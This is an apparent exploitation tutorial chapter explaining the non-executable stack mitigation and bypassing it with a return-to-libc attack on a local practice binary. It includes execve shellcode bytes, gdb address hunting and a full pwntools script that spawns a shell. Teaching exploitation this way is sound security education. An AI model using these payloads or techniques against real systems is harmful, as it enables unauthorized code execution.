# Security techniques

Security techniques were invented to prevent exploitation of the programs. Each of them is aimed at concrete vulnerability. In general, these techniques are just compiler options or OS configuration.

## Non-Executable Stack(NX)

Prevents the attacker from jumping to the shellcode within the stack. I disabled it before with an option of the compiler: `-z execstack`. Thus, it makes the stack executable or, in other words, it allows you to execute the content of the stack.

Let's try our stack-overflow exploit that we did before.

Firstly, start the exploit without the NX option:
```bash
$ checksec stack-overflow
[*] '/home/shogun/repos/basics-of-pwn/content/stack-overflow/stack-overflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
$ python3 exploit.py
[+] Starting local process './stack-overflow': pid 6803
[*] Switching to interactive mode
$ w
19:56:08 up 28 min,  1 user,  load average: 0.47, 0.65, 0.60
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               19:27   28:37   1:25   1.39s xfce4-session
$  
```

Exploit works.

Now, try it with NX enabled:
```bash
$ gcc ../stack-overflow/stack-overflow.c -o stack-overflow-with-nx -fno-stack-protector -no-pie
$ checksec stack-overflow-with-nx
[*] '/home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ cp ../stack-overflow/exploit.py stack-overflow-exploit.py
$ python3 stack-overflow-exploit.py
[+] Starting local process './stack-overflow-with-nx': pid 7040
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$ w
[*] Process './stack-overflow-with-nx' stopped with exit code -11 (SIGSEGV) (pid 7040)
[*] Got EOF while sending in interactive
```

Okay, you can see that the NX option is enabled as `checksec` said. And exploit is broken. Let's try without script:
```bash
$ (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"'; cat) | ./stack-overflow-with-nx

Segmentation fault (core dumped)
```

Okay, the program just crashed.

In gdb:
```bash
gef➤  unset environment LINES
gef➤  unset environment COLUMNS
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\x36\xcf\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcf36 in ?? ()
gef➤  x/100wx $esp - 0x12a
0xffffcea6:	0xcfc8f7fa	0x923affff	0xcec60804	0xcf00ffff
0xffffceb6:	0x0003ffff	0x92240000	0xd0000804	0xe76cf7ff
0xffffcec6:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xffffced6:	0xb0e18953	0x4180cd0b	0x41414141	0x41414141
0xffffcee6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcef6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf06:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf16:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf26:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf36:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf46:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf56:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf66:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf76:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf86:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcf96:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfa6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfb6:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcfc6:	0x41414141	0xcf364141	0x8000ffff	0x8000f7fa
0xffffcfd6:	0x0000f7fa	0xbee50000	0x0001f7dd	0xd0740000
0xffffcfe6:	0xd07cffff	0xd004ffff	0x8000ffff	0x0000f7fa
0xffffcff6:	0xd0580000	0x0000ffff	0xd0000000	0x0000f7ff
0xffffd006:	0x80000000	0x8000f7fa	0x0000f7fa	0x1c800000
0xffffd016:	0x9a909e20	0x0000dac2	0x00000000	0x00000000
0xffffd026:	0x00010000	0x90c00000	0x00000804	0x7cd40000
gef➤  r < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\xc6\xce\xff\xff"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*239 + "\xc6\xce\xff\xff"')

Program received signal SIGSEGV, Segmentation fault.
0xffffcec6 in ?? ()
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x08049000 0x0804a000 0x00001000 r-x /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804a000 0x0804b000 0x00002000 r-- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804b000 0x0804c000 0x00002000 r-- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804c000 0x0804d000 0x00003000 rw- /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx
0x0804d000 0x0806f000 0x00000000 rw- [heap]
0xf7dbd000 0xf7dda000 0x00000000 r-- /lib/i386-linux-gnu/libc-2.31.so
0xf7dda000 0xf7f35000 0x0001d000 r-x /lib/i386-linux-gnu/libc-2.31.so
0xf7f35000 0xf7fa5000 0x00178000 r-- /lib/i386-linux-gnu/libc-2.31.so
0xf7fa5000 0xf7fa6000 0x001e8000 --- /lib/i386-linux-gnu/libc-2.31.so
0xf7fa6000 0xf7fa8000 0x001e8000 r-- /lib/i386-linux-gnu/libc-2.31.so
0xf7fa8000 0xf7faa000 0x001ea000 rw- /lib/i386-linux-gnu/libc-2.31.so
0xf7faa000 0xf7fac000 0x00000000 rw-
0xf7fcb000 0xf7fcd000 0x00000000 rw-
0xf7fcd000 0xf7fd0000 0x00000000 r-- [vvar]
0xf7fd0000 0xf7fd1000 0x00000000 r-x [vdso]
0xf7fd1000 0xf7fd2000 0x00000000 r-- /lib/i386-linux-gnu/ld-2.31.so
0xf7fd2000 0xf7ff0000 0x00001000 r-x /lib/i386-linux-gnu/ld-2.31.so
0xf7ff0000 0xf7ffb000 0x0001f000 r-- /lib/i386-linux-gnu/ld-2.31.so
0xf7ffc000 0xf7ffd000 0x0002a000 r-- /lib/i386-linux-gnu/ld-2.31.so
0xf7ffd000 0xf7ffe000 0x0002b000 rw- /lib/i386-linux-gnu/ld-2.31.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

Even, if you will jump to the right address the program will not execute it, because you can see that the stack hasn't an X flag.

But, it doesn't mean that you can't exploit it now. You can apply two exploitation techniques here: `Return to libc attack(ret2libc)` and `Return-Oriented programming(ROP)`.

### Return to libc attack

This attack includes searching addresses of useful functions within libc.

Again, consider our old stack-overflow program and determine the offset to return address within gdb:
```bash
gef➤  r < <(python -c 'print "A"*262 + "B"*4')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "A"*262 + "B"*4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Now, find addresses within libc. An easy and always useful function to use in the exploit is a `system`, then, you need string `/bin/sh` as an argument to it and last function exit.

```bash
gef➤  b *main
Breakpoint 1 at 0x8049243
gef➤  r
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx

Breakpoint 1, 0x08049243 in main ()
gef➤  print system
$2 = {<text variable, no debug info>} 0xf7e02830 <system>
gef➤  print exit
$3 = {<text variable, no debug info>} 0xf7df5170 <exit>
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx'(0x804a000-0x804b000), permission=r--
  0x804a008 - 0x804a00f  →   "/bin/sh"
[+] In '/home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx'(0x804b000-0x804c000), permission=r--
  0x804b008 - 0x804b00f  →   "/bin/sh"
[+] In '/lib/i386-linux-gnu/libc-2.31.so'(0xf7f35000-0xf7fa5000), permission=r--
  0xf7f4f352 - 0xf7f4f359  →   "/bin/sh"
gef➤  
```

Thus, you have the address of `system`, `exit`, and `/bin/sh` for the system as an argument. You just need to figure out how the stack works when you call a few functions in a row.

Usual stack view:
```
|        unused space       |
----------------------------- <--- some_func2()
|       func variables      |
-----------------------------
|         saved ebp         |
-----------------------------
|     saved ret address     |
-----------------------------
|       func arguments      |
----------------------------- <--- some_func() that calls some_func2()
|  previous func variables  |
-----------------------------
|      prev. saved ebp      |
-----------------------------
|  prev. saved ret address  |
-----------------------------
|    prev. func arguments   |
-----------------------------
```

The stack when you do a ret2libc attack:
```
|        unused space       |
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
|AAAAAAAAAAAAAAAAAAAAAAAAAAA|
-----------------------------
| ret address to the system | <--- this is a place where the ret address stored for the current function(some function, whatever)
-----------------------------
|  ret address to the exit  |
-----------------------------
|    address of /bin/sh     |
-----------------------------
| null as end of input str. |
-----------------------------
```

After the first jump to the system function:
```
|        empty space        |
-----------------------------
|  ret address to the exit  | <--- this is a place where the ret address stored for the current function(system)
-----------------------------
|    address of /bin/sh     | <--- is considered as the first argument to the system
-----------------------------
| null as end of input str. |
-----------------------------
```

After the second jump to the exit function:
```
-----------------------------
| null as end of input str. | <--- as an argument to exit or exit with 0 code.
-----------------------------
|       something else      |
```

So, the final exploit will be just with all three correct address:
```bash
gef➤  r < <(python -c 'print "A"*262 + "\x30\x28\xe0\xf7" + "\x70\x51\xdf\xf7" + "\x52\xf3\xf4\xf7"')
Starting program: /home/shogun/repos/basics-of-pwn/content/security-techniques/stack-overflow-with-nx < <(python -c 'print "A"*262 + "\x30\x28\xe0\xf7" + "\x70\x51\xdf\xf7" + "\x52\xf3\xf4\xf7"')
[Detaching after vfork from child process 5366]
[Inferior 1 (process 5363) exited normally]
gef➤
```

You can see, that we executed child process. Try it outside gdb:
```bash
$ (python -c 'print "A"*262 + "\x30\x28\xe0\xf7" + "\x70\x51\xdf\xf7" + "\x52\xf3\xf4\xf7"'; cat) | ./stack-overflow-with-nx
w
 21:17:33 up 36 min,  1 user,  load average: 0.46, 0.37, 0.37
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               20:41   36:03   1:15   1.39s xfce4-session

```

Attack with `pwntools`:
```python
from pwn import *


# start the vuln program
p = process('./stack-overflow-with-nx')
system_addr = p32(0xf7e02830)
exit_addr = p32(0xf7df5170)
bin_sh_addr = p32(0xf7f4f352)
payload = b'A' * 262
payload += system_addr
payload += exit_addr
payload += bin_sh_addr
p.sendline(payload)
p.interactive()
```
